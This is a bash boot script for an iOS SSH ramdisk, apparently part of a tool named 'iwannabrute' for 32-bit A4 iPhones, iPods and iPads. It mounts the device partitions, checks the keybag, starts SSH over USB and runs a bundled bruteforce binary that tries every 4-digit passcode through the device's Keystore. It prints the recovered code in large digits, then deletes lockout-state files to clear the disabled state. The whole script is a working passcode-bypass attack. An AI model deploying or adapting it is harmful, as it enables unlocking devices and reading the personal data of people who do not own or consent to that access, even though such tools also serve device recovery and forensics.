#!/bin/bash
phase_log=""

emit_phase() {
    local phase="$1"
    local state="$2"
    local status="${3:--}"
    local message="[IWANNABRUTE] PHASE=$phase STATE=$state EXIT=$status"
    case "$phase-$state" in
        AES_ACCESS-*|BRUTEFORCE-*|BRUTEFORCE_METHOD-*|PERSIST_PHASE_LOG-*|CLEAR_DISABLED_STATE-*)
            if [[ "$state" != "FATAL" ]]; then
                :
            else
                echo "$message" > /dev/console
            fi
            ;;
        *)
            echo "$message" > /dev/console
            ;;
    esac
    if [[ -n "$phase_log" ]]; then
        echo "$message" >> "$phase_log"
    fi
}

run_phase() {
    local phase="$1"
    shift
    local status
    emit_phase "$phase" START
    "$@" >> /dev/console 2>&1
    status=$?
    emit_phase "$phase" EXIT "$status"
    return "$status"
}

fail_phase() {
    emit_phase "$1" FATAL "$2"
    exit "$2"
}

delay_seconds() {
    # Never read /dev/console (kernel logs can block on a partial line).
    # Never open a fifo for read -t: iOS bash can block forever on open when
    # there is no writer, and timeout does not apply to that open.
    local start end now
    start="$(/bin/date +%s 2>/dev/null)" || start="$(date +%s 2>/dev/null)" || start=""
    if [[ -n "$start" ]]; then
        end=$((start + $1))
        now="$start"
        while [[ "$now" -lt "$end" ]]; do
            now="$(/bin/date +%s 2>/dev/null)" || now="$(date +%s 2>/dev/null)" || break
        done
    fi
}

first_block_device() {
    local candidate
    for candidate in "$@"; do
        if [[ -b "$candidate" || -e "$candidate" ]]; then
            echo "$candidate"
            return 0
        fi
    done
    return 1
}

wait_for_data_device() {
    local attempt
    for ((attempt=1; attempt<=120; attempt++)); do
        if first_block_device /dev/disk0s1s2 /dev/disk0s2s1 /dev/disk0s2 >/dev/null; then
            echo "Data partition device appeared after $attempt second(s)." > /dev/console
            ls -l /dev/disk* > /dev/console 2>&1
            return 0
        fi
        if (( attempt == 1 || attempt % 5 == 0 )); then
            echo "Waiting for data partition (${attempt}s)..." > /dev/console
            if (( attempt == 1 )); then
                ls -l /dev/disk* > /dev/console 2>&1
            fi
        fi
        delay_seconds 1
    done
    echo "Timed out waiting for an A4 data partition device." > /dev/console
    ls -l /dev/disk* > /dev/console 2>&1
    return 1
}

mount_and_verify_data() {
    local attempt data_device mounts system_device
    for attempt in 1 2 3; do
        mounts="$(mount)"
        system_device="$(first_block_device /dev/disk0s1s1 /dev/disk0s1 || true)"

        if [[ "$mounts" != *" on /mnt1 "* && -n "$system_device" ]]; then
            echo "Mounting $system_device on /mnt1..." > /dev/console
            mount_hfs "$system_device" /mnt1 >> /dev/console 2>&1
        fi

        mounts="$(mount)"
        if [[ "$mounts" != *" on /mnt2 "* ]]; then
            data_device="$(first_block_device /dev/disk0s1s2 /dev/disk0s2s1 /dev/disk0s2 || true)"
            if [[ -z "$data_device" ]]; then
                echo "No data partition device is present yet." > /dev/console
            else
                echo "Mounting $data_device on /mnt2 (attempt $attempt/3)..." > /dev/console
                mount_hfs "$data_device" /mnt2 >> /dev/console 2>&1
            fi
        fi

        if [[ -s /mnt2/keybags/systembag.kb ]]; then
            echo "Verified /mnt2/keybags/systembag.kb." > /dev/console
            return 0
        fi
        echo "Data mount did not expose /mnt2/keybags/systembag.kb." > /dev/console
        mount > /dev/console 2>&1
        if [[ -d /mnt2/keybags ]]; then
            /bin/ls -la /mnt2/keybags > /dev/console 2>&1
        else
            /bin/ls -la /mnt2 > /dev/console 2>&1
        fi
        delay_seconds 3
    done
    return 1
}

print_big_passcode() {
    local code="$1" ch row col bits i out
    echo > /dev/console
    for row in 0 1 2 3 4; do
        out=""
        i=0
        while [[ $i -lt ${#code} ]]; do
            ch="${code:$i:1}"
            case "$ch" in
                0) bits="0111010001100011000101110" ;;
                1) bits="0010001100001000010001110" ;;
                2) bits="0111010001000100010001111" ;;
                3) bits="0111010001001101000101110" ;;
                4) bits="0001000110010101111100010" ;;
                5) bits="1111100000111100000101110" ;;
                6) bits="0111010000111101000101110" ;;
                7) bits="1111100010001000100001000" ;;
                8) bits="0111010001011101000101110" ;;
                9) bits="0111010001011110000101110" ;;
                *) bits="0000000000000000000000000" ;;
            esac
            col=0
            while [[ $col -lt 5 ]]; do
                if [[ "${bits:$((row * 5 + col)):1}" == "1" ]]; then
                    out="${out}"$'\033[42m \033[0m'
                else
                    out="${out} "
                fi
                col=$((col + 1))
            done
            out="${out}  "
            i=$((i + 1))
        done
        printf '%s\n' "$out" > /dev/console
    done
    echo > /dev/console
}

passcode_from_log() {
    local line passcode=""
    while IFS= read -r line; do
        case "$line" in
            "Found passcode :"*)
                passcode="${line#Found passcode :}"
                passcode="${passcode# }"
                ;;
            "Finished:"*)
                passcode="${line#Finished:}"
                passcode="${passcode# }"
                ;;
        esac
    done < "$1"
    printf '%s\n' "$passcode"
}

run_ipad_bruteforce() {
    local log passcode
    if [[ -d /mnt1/private/etc ]]; then
        log="/mnt1/private/etc/iwannabrute-bruteforce.log"
    else
        log="/mnt2/iwannabrute-bruteforce.log"
    fi

    echo "Bruteforcing using Keystore." > /dev/console
    echo "Checking 0000 to 9999." > /dev/console
    emit_phase BRUTEFORCE_METHOD KEYSTORE
    /usr/bin/bruteforce -u -n > "$log" 2>&1
    passcode="$(passcode_from_log "$log")"
    if [[ -n "$passcode" ]]; then
        echo "Found passcode : $passcode" > /dev/console
        print_big_passcode "$passcode"
        return 0
    fi

    echo "Keystore did not find a 4-digit passcode; using manual derivation." > /dev/console
    emit_phase BRUTEFORCE_METHOD USERLAND_FALLBACK
    /usr/bin/bruteforce -n >> /dev/console 2>&1
}

start_usb_ssh() {
    if [[ "$device_profile" == "iPad1,1" ]]; then
        # The iOS 7 restored_external USB helper segfaults on this ramdisk.
        # iPad rc.boot starts /sbin/sshd instead; a second start is harmless.
        emit_phase START_RESTORED SKIPPED 0
        if [[ -x /sbin/sshd ]]; then
            /sbin/sshd >> /dev/console 2>&1
            emit_phase START_SSHD EXIT "$?"
        else
            emit_phase START_SSHD SKIPPED 1
        fi
        return 0
    fi

    # restored_external initializes USB mux and runs sshd in inetd mode.
    # Starting a standalone sshd first occupies port 22 and makes it exit.
    emit_phase START_RESTORED START
    /usr/local/bin/restored_external.sshrd >> /dev/console 2>&1 &
    restored_pid=$!
    delay_seconds 2
    if kill -0 "$restored_pid" 2>/dev/null; then
        emit_phase START_RESTORED RUNNING 0
        emit_phase START_SSHD MANAGED_BY_RESTORED 0
        return 0
    fi
    wait "$restored_pid"
    restored_status=$?
    emit_phase START_RESTORED EXIT "$restored_status"
    fail_phase START_RESTORED "$restored_status"
}

echo "32-bit Bruteforce SSH Ramdisk by meowcat454, AJAIZ, platinumstuff and Scratchycarl" > /dev/console
echo "--------------------------------" > /dev/console
device_profile=""
if [[ -f /iwannabrute.profile ]]; then
    read -r device_profile < /iwannabrute.profile
    echo "Ramdisk profile: $device_profile" > /dev/console
fi
emit_phase SETUP START

if [[ "$device_profile" == "iPad1,1" ]]; then
    # iOS 5 panics in GetMasterBlock while remounting the ramdisk root.
    # iPhone/iPod A4 kernels return EPERM here and can keep going.
    echo "Skipping rw,union remount of / on iPad1,1." > /dev/console
    emit_phase MOUNT_ROOTFS SKIPPED 0
else
    run_phase MOUNT_ROOTFS mount -o rw,union,update /
    root_mount_status=$?
    if [[ "$root_mount_status" -ne 0 ]]; then
        # A4 restore ramdisks can remain read-only while the data partitions,
        # SSH daemon, and bruteforce payload still work.
        emit_phase MOUNT_ROOTFS NONFATAL "$root_mount_status"
    fi
fi

run_phase SET_AUTOBOOT nvram auto-boot=1 ||
    fail_phase SET_AUTOBOOT "$?"

if [[ "$device_profile" == "iPad1,1" ]]; then
    run_phase WAIT_DATA_DEVICE wait_for_data_device ||
        fail_phase WAIT_DATA_DEVICE "$?"
    run_phase MOUNT_DATA mount_and_verify_data ||
        fail_phase MOUNT_DATA "$?"
    start_usb_ssh
else
    start_usb_ssh
    run_phase WAIT_DATA_DEVICE wait_for_data_device ||
        fail_phase WAIT_DATA_DEVICE "$?"
    run_phase MOUNT_DATA mount_and_verify_data ||
        fail_phase MOUNT_DATA "$?"
fi

if [[ -d /mnt1/private/etc ]]; then
    persistent_phase_log="/mnt1/private/etc/iwannabrute-phases.log"
    : > "$persistent_phase_log"
    persist_status=$?
    if [[ "$persist_status" -eq 0 ]]; then
        phase_log="$persistent_phase_log"
    fi
    emit_phase PERSIST_PHASE_LOG EXIT "$persist_status"
else
    emit_phase PERSIST_PHASE_LOG EXIT 1
fi

# The bundled bruteforce process performs the first AES access; there is no
# separate AES probe binary. This marker records the attempted boundary, not a
# confirmed successful connection to IOAESAccelerator.
emit_phase AES_ACCESS ATTEMPT
emit_phase BRUTEFORCE START
if [[ "$device_profile" == "iPad1,1" ]]; then
    run_ipad_bruteforce
else
    /usr/bin/bruteforce >> /dev/console 2>&1
fi
bruteforce_status=$?
emit_phase BRUTEFORCE EXIT "$bruteforce_status"
emit_phase AES_ACCESS PROCESS_EXIT "$bruteforce_status"
if [[ "$bruteforce_status" -ne 0 ]]; then
    fail_phase BRUTEFORCE "$bruteforce_status"
fi

emit_phase CLEAR_DISABLED_STATE START

disabled_status=0
if cd /mnt2/mobile/Library/Preferences/; then
    for file in com.apple.springboard.plist.???????; do
        if [[ -f "$file" ]]; then
            rm -f "$file" > /dev/null || disabled_status=1
        fi
    done
    if [[ -f com.apple.springboard.plist ]]; then
        mv -f com.apple.springboard.plist com.apple.springboard.plist.bak > /dev/null ||
            disabled_status=1
    fi
else
    disabled_status=1
fi
rm -f /mnt2/mobile/Library/SpringBoard/LockoutStateJournal.plist > /dev/null ||
    disabled_status=1
emit_phase CLEAR_DISABLED_STATE EXIT "$disabled_status"
emit_phase SETUP EXIT "$disabled_status"
exit "$disabled_status"
